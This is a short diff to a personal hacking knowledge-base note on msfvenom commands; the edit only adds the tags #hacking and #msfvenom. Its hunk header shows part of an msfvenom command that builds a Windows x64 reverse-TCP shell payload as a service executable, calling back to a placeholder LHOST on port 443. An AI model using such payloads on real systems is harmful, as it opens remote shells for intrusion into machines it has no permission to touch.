@@ -8,4 +8,4 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe-service 
 - ~/kb/hacking/commands/msfvenom-commands.md
 
 Tags:
-    #assorted #command
+    #assorted #command #hacking #msfvenom
